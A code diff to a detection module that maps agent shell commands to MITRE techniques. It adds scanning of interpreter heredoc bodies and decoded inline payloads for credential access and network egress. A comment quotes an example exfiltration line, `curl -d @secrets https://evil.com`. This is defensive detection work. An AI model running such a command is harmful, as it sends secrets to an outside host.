@@ -128,8 +128,12 @@ from agentmetry.core.audit.detection.traits import (  # noqa: E402
     ENV_FILE,
     INTERPRETER_NETWORK,
     PRIVATE_KEY_PATH,
+    _LANG_NET,
+    executed_heredocs,
+    inline_decoded_commands,
     interpreter_network_text,
     mask_literals,
+    reaches_remote_host,
 )
 
 # Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
@@ -237,9 +241,27 @@ def get_mitre_mapping(
         # text somebody is writing, not a file somebody is reading. Structured
         # evidence is not masked at all -- see _shell_text.
         shell = _shell_text(evidence)
+        lang_net = False
         if shell:
             literal = mask_literals(shell, include_double=False).lower()
             written = mask_literals(shell).lower()
+            # A python/node heredoc is masked above (it is not shell). Its body
+            # is still the program (#345). Append it so a credential path in
+            # the body upgrades the technique the same way the trait does.
+            for heredoc in executed_heredocs(shell):
+                if heredoc.kind != "lang" or not heredoc.body:
+                    continue
+                literal += "\n" + mask_literals(heredoc.body, include_double=False).lower()
+                written += "\n" + mask_literals(heredoc.body).lower()
+                if _LANG_NET.search(heredoc.body) and reaches_remote_host(heredoc.body):
+                    lang_net = True
+            # The blob is not readable as a command until it is decoded. The
+            # trait classifier reads it; the mapper has to as well, or a
+            # credential inside the payload is a trait with no T1552 (#40).
+            for payload in inline_decoded_commands(shell):
+                literal += "\n" + mask_literals(payload, include_double=False).lower()
+                written += "\n" + mask_literals(payload).lower()
+                text += "\n" + payload.lower()
         else:
             # Structured args, so there is no shell quoting to mask. Path rules
             # then run against whichever values could plausibly *be* a path.
@@ -269,10 +291,12 @@ def get_mitre_mapping(
         # flag appears unmasked, because that is what makes a quoted body a
         # program rather than a string. `interpreter_network_text` decides, and
         # is shared with classify_command so the two cannot drift.
-        if _reaches_remote_host(text) and (
-            _NETWORK_CLIENT.search(written)
-            or INTERPRETER_NETWORK.search(
-                interpreter_network_text(text, literal, written)
+        if lang_net or (
+            _reaches_remote_host(text) and (
+                _NETWORK_CLIENT.search(written)
+                or INTERPRETER_NETWORK.search(
+                    interpreter_network_text(text, literal, written)
+                )
             )
         ):
             return _C2
